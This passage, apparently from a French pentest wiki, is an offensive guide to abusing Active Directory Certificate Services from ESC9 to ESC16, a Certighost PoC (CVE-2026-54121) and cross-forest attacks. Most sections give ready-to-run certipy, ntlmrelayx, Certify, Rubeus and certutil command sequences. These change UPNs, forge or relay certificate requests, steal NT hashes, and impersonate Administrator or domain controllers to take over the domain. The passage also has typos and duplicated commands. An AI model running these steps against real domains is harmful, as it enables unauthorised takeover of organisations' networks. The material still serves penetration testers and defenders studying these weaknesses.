La nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) pour **`msPKI-Enrollment-Flag`**, appelée ESC9, empêche l’intégration de la **nouvelle extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`** dans un certificat. Ce flag devient pertinent lorsque `StrongCertificateBindingEnforcement` est défini sur `1` (paramètre par défaut), contrairement à une valeur de `2`. Sa pertinence est accrue dans les scénarios où un mapping de certificat plus faible pour Kerberos ou Schannel pourrait être exploité (comme dans ESC10), car l’absence d’ESC9 ne modifierait pas les exigences.<sup>[[7]](#references)</sup>

Les conditions dans lesquelles la configuration de ce flag devient significative sont les suivantes :

- `StrongCertificateBindingEnforcement` n’est pas défini sur `2` (la valeur par défaut étant `1`), ou `CertificateMappingMethods` inclut le flag `UPN`.
- Le certificat est marqué avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans le paramètre `msPKI-Enrollment-Flag`.
- Un EKU d’authentification client est spécifié par le certificat.
- Des permissions `GenericWrite` sont disponibles sur un compte permettant d’en compromettre un autre.

### Scénario d’abus

Supposons que `John@corp.local` dispose de permissions `GenericWrite` sur `Jane@corp.local`, avec pour objectif de compromettre `Administrator@corp.local`. Le template de certificat `ESC9`, auquel `Jane@corp.local` est autorisée à s’inscrire, est configuré avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans son paramètre `msPKI-Enrollment-Flag`.

Initialement, le hash de `Jane` est obtenu à l’aide de Shadow Credentials, grâce aux permissions `GenericWrite` de `John` :
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant volontairement la partie domaine `@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct en tant que `userPrincipalName` de `Administrator`.

Ensuite, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane` :
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Il est à noter que le `userPrincipalName` du certificat reflète `Administrator`, sans aucun « object SID ».

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d’origine, `Jane@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tenter une authentification avec le certificat émis renvoie maintenant le hash NT de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` en raison de l'absence de spécification du domaine dans le certificat :
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappings de certificats faibles - ESC10

### Explication

Deux valeurs de clés de registre sur le contrôleur de domaine sont concernées par ESC10 :

- La valeur par défaut de `CertificateMappingMethods` sous `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` est `0x18` (`0x8 | 0x10`), alors qu'elle était précédemment définie sur `0x1F`.
- Le paramètre par défaut de `StrongCertificateBindingEnforcement` sous `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` est `1`, alors qu'il était précédemment défini sur `0`.<sup>[[7]](#references)</sup>

**Cas 1**

Lorsque `StrongCertificateBindingEnforcement` est configuré sur `0`.

**Cas 2**

Si `CertificateMappingMethods` inclut le bit `UPN` (`0x4`).

### Cas d'abus 1

Avec `StrongCertificateBindingEnforcement` configuré sur `0`, un compte A disposant des permissions `GenericWrite` peut être exploité pour compromettre n'importe quel compte B.

Par exemple, en disposant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant cherche à compromettre `Administrator@corp.local`. La procédure est similaire à ESC9, ce qui permet d'utiliser n'importe quel certificate template.

Tout d'abord, le hash de `Jane` est récupéré à l'aide de Shadow Credentials, en exploitant `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant délibérément la partie `@corp.local` afin d’éviter une violation de contrainte.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
À la suite de cela, un certificat permettant l’authentification du client est demandé en tant que `Jane`, à l’aide du modèle `User` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d'origine, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L’authentification avec le certificat obtenu permettra d’obtenir le hash NT de `Administrator@corp.local`, ce qui nécessite de spécifier le domaine dans la commande en raison de l’absence d’informations sur le domaine dans le certificat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Cas d'abus 2

Avec `CertificateMappingMethods` contenant le bit flag `UPN` (`0x4`), un compte A disposant des permissions `GenericWrite` peut compromettre n'importe quel compte B dépourvu de propriété `userPrincipalName`, y compris les comptes machine et le compte administrateur de domaine intégré `Administrator`.

Ici, l'objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` via Shadow Credentials, en exploitant `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Le `userPrincipalName` de `Jane` est alors défini sur `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificat pour l’authentification du client est demandé en tant que `Jane` à l’aide du modèle `User` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est rétabli à sa valeur d’origine après ce processus.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Pour s’authentifier via Schannel, l’option `-ldap-shell` de Certipy est utilisée, indiquant que l’authentification a réussi en tant que `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Via le shell LDAP, des commandes telles que `set_rbcd` permettent des attaques de Resource-Based Constrained Delegation (RBCD), susceptibles de compromettre le contrôleur de domaine.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Cette vulnérabilité s’étend également à tout compte utilisateur dépourvu de `userPrincipalName` ou dont la valeur ne correspond pas à `sAMAccountName`. Le compte par défaut `Administrator@corp.local` constitue une cible privilégiée en raison de ses privilèges LDAP élevés et de l’absence de `userPrincipalName` par défaut.

## Relaying NTLM to ICPR - ESC11

### Explication

Si le serveur CA n’est pas configuré avec `IF_ENFORCEENCRYPTICERTREQUEST`, il est possible d’effectuer des attaques de NTLM relay sans signature via le service RPC. [Référence](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Vous pouvez utiliser `certipy` pour vérifier si `Enforce Encryption for Requests` est désactivé ; certipy affichera alors les vulnérabilités `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scénario d’abus

Il est nécessaire de configurer un serveur de relais :
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Remarque : Pour les domain controllers, nous devons spécifier `-template` dans DomainController.

Ou en utilisant [le fork d'impacket de sploutchy](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access à l’ADCS CA avec YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer la Certificate Authority afin de la stocker sur un périphérique externe comme le « Yubico YubiHSM2 ».

Si un périphérique USB est connecté au serveur CA via un port USB, ou à un USB device server dans le cas où le serveur CA est une machine virtuelle, une clé d’authentification (parfois appelée « mot de passe ») est requise pour que le Key Storage Provider génère et utilise les clés dans le YubiHSM.

Cette clé/ce mot de passe est stocké dans le registre sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en texte clair.

Référence [ici](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scénario d’exploitation

Si la clé privée de la CA est stockée sur un périphérique USB physique lorsque vous obtenez un shell access, il est possible de récupérer la clé.

Tout d’abord, vous devez obtenir le certificat de la CA (celui-ci est public), puis :
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, utilisez la commande `certutil -sign` pour forger un nouveau certificat arbitraire à l'aide du certificat de l'AC et de sa clé privée.

## OID Group Link Abuse - ESC13

### Explication

L'attribut `msPKI-Certificate-Policy` permet d'ajouter la stratégie d'émission au modèle de certificat. Les objets `msPKI-Enterprise-Oid` responsables de l'émission des stratégies peuvent être découverts dans le Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) du conteneur PKI OID. Une stratégie peut être liée à un groupe AD à l'aide de l'attribut `msDS-OIDToGroupLink` de cet objet, permettant ainsi à un système d'autoriser un utilisateur qui présente le certificat comme s'il était membre du groupe. [Référence ici](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

En d'autres termes, lorsqu'un utilisateur dispose de l'autorisation d'enrôler un certificat et que le certificat est lié à un groupe OID, l'utilisateur peut hériter des privilèges de ce groupe.

Utilisez [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) pour trouver OIDToGroupLink :
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scénario d’abus

Trouvez une permission utilisateur avec `certipy find` ou `Certify.exe find /showAllPermissions`.

Si `John` dispose de la permission de s’inscrire à `VulnerableTemplate`, l’utilisateur peut hériter des privilèges du groupe `VulnerableGroup`.

Il lui suffit de spécifier le template pour obtenir un certificat avec les droits `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuration vulnérable du renouvellement de certificat - ESC14

### Explication

La description disponible à l'adresse https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping est particulièrement exhaustive. Ci-dessous figure une citation du texte original.<sup>[[14]](#references)</sup>

ESC14 concerne les vulnérabilités résultant d'un « weak explicit certificate mapping », principalement dues à l'utilisation abusive ou à la configuration non sécurisée de l'attribut `altSecurityIdentities` sur les comptes utilisateur ou ordinateur Active Directory. Cet attribut multivalué permet aux administrateurs d'associer manuellement des certificats X.509 à un compte AD à des fins d'authentification. Lorsqu'ils sont renseignés, ces mappings explicites peuvent remplacer la logique de mapping par défaut des certificats, qui repose généralement sur les UPN ou les noms DNS présents dans le SAN du certificat, ou sur le SID intégré dans l'extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`.

Un mapping « faible » se produit lorsque la valeur de chaîne utilisée dans l'attribut `altSecurityIdentities` pour identifier un certificat est trop large, facilement devinable, repose sur des champs de certificat non uniques ou utilise des composants de certificat facilement usurpables. Si un attacker peut obtenir ou créer un certificat dont les attributs correspondent à un mapping explicite faible défini pour un compte privilégié, il peut utiliser ce certificat pour s'authentifier en tant que ce compte et l'usurper.

Voici quelques exemples de chaînes de mapping `altSecurityIdentities` potentiellement faibles :

- Mapping uniquement basé sur un Subject Common Name (CN) courant : par exemple, `X509:<S>CN=SomeUser`. Un attacker pourrait être en mesure d'obtenir un certificat avec ce CN depuis une source moins sécurisée.
- Utilisation de Distinguished Names (DN) d'Issuer ou de Subject trop génériques, sans qualification supplémentaire telle qu'un numéro de série spécifique ou un subject key identifier : par exemple, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Utilisation d'autres modèles prévisibles ou d'identifiants non cryptographiques qu'un attacker pourrait être en mesure de satisfaire dans un certificat qu'il peut obtenir ou forger légitimement (s'il a compromis une CA ou trouvé un template vulnérable comme dans ESC1).

L'attribut `altSecurityIdentities` prend en charge différents formats de mapping, tels que :

- `X509:<I>IssuerDN<S>SubjectDN` (mapping basé sur les DN complets de l'Issuer et du Subject)
- `X509:<SKI>SubjectKeyIdentifier` (mapping basé sur la valeur de l'extension Subject Key Identifier du certificat)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapping basé sur le numéro de série, implicitement qualifié par le DN de l'Issuer) - il ne s'agit pas d'un format standard, il s'agit généralement de `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapping basé sur un nom RFC822, généralement une adresse e-mail, provenant du SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapping basé sur un hash SHA1 de la clé publique brute du certificat - généralement robuste)

La sécurité de ces mappings dépend fortement de la spécificité, de l'unicité et de la robustesse cryptographique des identifiants de certificat choisis dans la chaîne de mapping. Même lorsque des modes de liaison forte des certificats sont activés sur les contrôleurs de domaine (ce qui affecte principalement les mappings implicites basés sur les UPN/DNS du SAN et sur l'extension SID), une entrée `altSecurityIdentities` mal configurée peut toujours constituer un chemin direct vers l'usurpation si la logique de mapping elle-même est défaillante ou trop permissive.
### Scénario d'exploitation

ESC14 cible les **explicit certificate mappings** dans Active Directory (AD), plus précisément l'attribut `altSecurityIdentities`. Si cet attribut est défini (intentionnellement ou à la suite d'une mauvaise configuration), les attackers peuvent usurper des comptes en présentant des certificats correspondant au mapping.

#### Scénario A : L'attacker peut écrire dans `altSecurityIdentities`

**Condition préalable** : L'attacker dispose des permissions d'écriture sur l'attribut `altSecurityIdentities` du compte cible, ou de la permission de les lui accorder sous la forme de l'une des permissions suivantes sur l'objet AD cible :
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scénario B : La cible utilise un mapping faible via X509RFC822 (e-mail)

- **Condition préalable** : La cible possède un mapping X509RFC822 faible dans altSecurityIdentities. Un attacker peut définir l'attribut mail de la victime pour qu'il corresponde au nom X509RFC822 cible, inscrire un certificat en tant que victime et l'utiliser pour s'authentifier en tant que cible.
#### Scénario C : La cible utilise un mapping X509IssuerSubject

- **Condition préalable** : La cible possède un mapping explicite X509IssuerSubject faible dans `altSecurityIdentities`.L'attacker peut définir l'attribut `cn` ou `dNSHostName` d'un principal victime afin qu'il corresponde au subject du mapping X509IssuerSubject de la cible. Ensuite, l'attacker peut inscrire un certificat en tant que victime et utiliser ce certificat pour s'authentifier en tant que cible.
#### Scénario D : La cible utilise un mapping X509SubjectOnly

- **Condition préalable** : La cible possède un mapping explicite X509SubjectOnly faible dans `altSecurityIdentities`. L'attacker peut définir l'attribut `cn` ou `dNSHostName` d'un principal victime afin qu'il corresponde au subject du mapping X509SubjectOnly de la cible. Ensuite, l'attacker peut inscrire un certificat en tant que victime et utiliser ce certificat pour s'authentifier en tant que cible.
### opérations concrètes
#### Scénario A

Demander un certificat du certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Enregistrer et convertir le certificat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
S’authentifier (à l’aide du certificat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Nettoyage (facultatif)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, veuillez consulter les éléments suivants : [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explication

La description disponible à l'adresse https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc est particulièrement complète. Vous trouverez ci-dessous une citation du texte original.<sup>[[15]](#references)</sup>

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Exploitation

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Cliquez ici pour consulter des méthodes d'utilisation plus détaillées.<sup>[[14]](#references)</sup>


La commande `find` de Certipy peut aider à identifier les modèles V1 potentiellement vulnérables à ESC15 si la CA n'est pas corrigée.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scénario A : Direct Impersonation via Schannel

**Étape 1 : Demander un certificate en injectant l’Application Policy "Client Authentication" et le UPN cible.** L’attaquant `attacker@corp.local` cible `administrator@corp.local` en utilisant le template "WebServer" V1 (qui autorise un subject fourni par l’enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'` : Le template V1 vulnérable avec « Enrollee supplies subject ».
- `-application-policies 'Client Authentication'` : Injecte l’OID `1.3.6.1.5.5.7.3.2` dans l’extension Application Policies du CSR.
- `-upn 'administrator@corp.local'` : Définit l’UPN dans le SAN pour l’impersonation.

**Étape 2 : S’authentifier via Schannel (LDAPS) à l’aide du certificat obtenu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scénario B : PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Étape 1 : Demander un certificat à partir d’un modèle V1 (avec « Enrollee supplies subject »), en injectant la stratégie d’application « Certificate Request Agent ».** Ce certificat est destiné à l’attaquant (`attacker@corp.local`) afin qu’il devienne un enrollment agent. Aucun UPN n’est spécifié pour l’identité propre de l’attaquant ici, car l’objectif est d’obtenir la capacité d’agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'` : Injecte l’OID `1.3.6.1.4.1.311.20.2.1`.

**Étape 2 : Utiliser le certificat « agent » pour demander un certificat au nom d’un utilisateur privilégié cible.** Il s’agit d’une étape similaire à ESC3, utilisant le certificat de l’Étape 1 comme certificat d’agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Étape 3 : S’authentifier en tant qu’utilisateur privilégié à l’aide du certificat « on-behalf-of ».**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explication

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** fait référence au scénario dans lequel, si la configuration d’AD CS n’impose pas l’inclusion de l’extension **szOID_NTDS_CA_SECURITY_EXT** dans tous les certificats, un attaquant peut l’exploiter afin de :

1. Demander un certificat **sans SID binding**.

2. Utiliser ce certificat **pour s’authentifier en tant que n’importe quel compte**, notamment en usurpant l’identité d’un compte disposant de privilèges élevés (par exemple, un Domain Administrator).

Vous pouvez également consulter cet article pour en apprendre davantage sur le principe détaillé :https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Exploitation

Les éléments suivants font référence à [ce lien](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), cliquez pour consulter des méthodes d’utilisation plus détaillées.<sup>[[14]](#references)</sup>

Pour identifier si l’environnement Active Directory Certificate Services (AD CS) est vulnérable à **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Étape 1 : Lire le UPN initial du compte victime (facultatif - pour restauration).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Étape 2 : Mettez à jour l’UPN du compte victime avec le `sAMAccountName` de l’administrateur cible.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Étape 3 : (si nécessaire) Obtenir les identifiants du compte « victim » (par ex. via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Étape 4 : Demandez un certificat en tant qu’utilisateur « victim » depuis _n’importe quel modèle d’authentification client approprié_ (par exemple, « User ») sur la CA vulnérable à ESC16.** Comme la CA est vulnérable à ESC16, elle omettra automatiquement l’extension de sécurité SID du certificat délivré, quels que soient les paramètres spécifiques du modèle pour cette extension. Définissez la variable d’environnement du cache d’identifiants Kerberos (commande shell) :
```bash
export KRB5CCNAME=victim.ccache
```
Demandez ensuite le certificat :
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Étape 5 : Rétablir l’UPN du compte « victim ».**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Étape 6 : S’authentifier en tant qu’administrateur cible.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Substitution d'identité via Rogue LDAP/LSA chase callback (Certighost / CVE-2026-54121)

### Explication

**Certighost** abuse un **AD CS enrollment chase / callback path** dans lequel la CA fait confiance aux attributs de requête fournis par le demandeur pour résoudre l'identité qui doit être placée dans le certificat émis. Dans le PoC public, la requête forgée inclut :<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`** : hôte/IP contrôlé par l'attaquant que la CA contactera
- **`rmd`** : nom DNS du **Domain Controller cible** à usurper

Si la CA suit ce chase, elle se connectera à l'attaquant via **SMB/LSA (`445`)** et **LDAP (`389`)**. L'attaquant utilise un **real machine account** (généralement créé via le **`ms-DS-MachineAccountQuota`** par défaut) afin que la session callback s'authentifie comme un principal de domaine valide, tandis que les services rogue renvoient les attributs d'identité du **DC cible** à la place :

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si la CA **ne lie pas cryptographiquement l'identité renvoyée au principal callback authentifié**, elle peut émettre un certificat pour le **Domain Controller**, même si la session s'est authentifiée avec le machine account contrôlé par l'attaquant. Cela rend le bug conceptuellement différent de **Certifried** : au lieu de réécrire des attributs AD tels que `dNSHostName`, l'attaquant **substitue les données d'identité lors de la résolution du callback de la CA**.<sup>[[2]](#references)</sup>

**Préconditions utiles :**

- **domain credentials** avec peu de privilèges
- Capacité à **créer ou réutiliser un computer account**
- Accessibilité réseau depuis la **CA** vers les **ports `389` et `445`** contrôlés par l'attaquant
- CA vulnérable / non corrigée avec ce request path (la mise à jour Microsoft du **14 juillet 2026** a ajouté une **validation du DC pour `cdc`** ainsi qu'une **comparaison du SID résolu**)

Le **`.pfx`** obtenu peut ensuite être utilisé pour **PKINIT**, afin de produire un **`.ccache`** et, dans le workflow du PoC publié, le **NT hash du DC cible**, ce qui suffit généralement à obtenir une **compromission complète du domaine**.

### Exploitation

Le PoC public automatise la chaîne complète :<sup>[[1]](#references)</sup>

1. Créer ou réutiliser un **machine account** contrôlé par l'attaquant.
2. Démarrer des **rogue LDAP et SMB/LSA listeners** sur les ports `389` et `445`.
3. Soumettre une demande de certificat contenant les attributs **`cdc`** contrôlé par l'attaquant et **`rmd`** ciblant le DC.
4. Laisser la CA s'authentifier auprès des rogue listeners avec le machine account contrôlé, puis répondre aux identity lookups avec les attributs du **DC cible**.
5. Recevoir un **certificat de DC** signé par la CA, puis l'utiliser pour **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Indicateurs d’exécution utiles de la PoC :

- `--listener <ip>` : choisit explicitement l’IP de callback annoncée dans `cdc`
- `--computer-name <NAME$>` : réutilise un compte machine existant au lieu d’en créer un nouveau

**Notes opérationnelles :**

- La PoC nécessite les privilèges **root**, car elle se lie aux ports **privilégiés** `389` et `445`.
- Une exploitation réussie écrit localement un **DC `.pfx`** et un **Kerberos `.ccache`**.
- Comme le certificat est associé à un **compte de Domain Controller**, les actions ultérieures peuvent inclure une **authentification Kerberos basée sur un certificat**, **DCSync** et la réutilisation du **hash NT de machine** récupéré.<sup>[[2]](#references)</sup>

## Compromission de forêts avec des certificats expliquée à la voix passive

### Rupture des relations d’approbation entre forêts par des CA compromises

La configuration de l’**enrollment inter-forêts** est rendue relativement simple. Le **certificat de la CA racine** de la resource forest est **publié dans les account forests** par les administrateurs, et les certificats des **enterprise CA** de la resource forest sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA de chaque account forest**. En d’autres termes, cette configuration donne à la **CA de la resource forest un contrôle complet** sur toutes les autres forêts pour lesquelles elle gère la PKI. Si cette CA était **compromise par des attaquants**, des certificats pour tous les utilisateurs des resource forest et account forests pourraient être **forgés par ces derniers**, rompant ainsi la limite de sécurité de la forêt.<sup>[[6]](#references)</sup>

### Privilèges d’enrollment accordés à des principaux étrangers

Dans les environnements multi-forêts, une attention particulière doit être accordée aux Enterprise CA qui **publient des modèles de certificats** permettant aux **Authenticated Users ou aux foreign principals** (utilisateurs/groupes externes à la forêt à laquelle appartient l’Enterprise CA) de disposer de **droits d’enrollment et de modification**.\
Lorsqu’une authentification est effectuée au travers d’un trust, le **SID des Authenticated Users** est ajouté au token de l’utilisateur par AD. Ainsi, si un domaine possède une Enterprise CA avec un modèle qui **accorde des droits d’enrollment aux Authenticated Users**, un utilisateur provenant d’une autre forêt pourrait potentiellement **effectuer un enrollment dans ce modèle**. De même, si des **droits d’enrollment sont explicitement accordés à un foreign principal par un modèle**, une **relation de contrôle d’accès inter-forêts est ainsi créée**, permettant à un principal d’une forêt de **s’enregistrer dans un modèle d’une autre forêt**.

Ces deux scénarios entraînent une **augmentation de la surface d’attaque** d’une forêt à l’autre. Les paramètres du modèle de certificat pourraient être exploités par un attaquant afin d’obtenir des privilèges supplémentaires dans un domaine étranger.<sup>[[6]](#references)</sup>


## Références

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
